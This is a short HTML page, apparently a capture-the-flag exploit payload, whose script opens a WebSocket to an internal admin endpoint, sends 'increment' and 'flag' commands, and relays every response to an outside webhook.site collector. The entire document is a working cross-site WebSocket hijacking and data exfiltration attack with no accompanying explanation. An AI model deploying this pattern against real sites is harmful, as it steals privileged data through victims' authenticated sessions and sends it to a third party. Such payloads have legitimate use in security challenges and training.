<!DOCTYPE html>
<html>
<head>
    <script>
        const ws = new WebSocket('ws://web:8080/admin/ws');
        ws.onopen = () => {
            ws.send('increment');
            ws.send('flag');
        }
        ws.onmessage = (message) => {
            const xhttp = new XMLHttpRequest();
            xhttp.open('GET', 'https://webhook.site/3d6fec3f-a86f-4ada-911f-5db410f9159d' + message.data, true);
            xhttp.send();
        }
    </script>
</head>
</html>
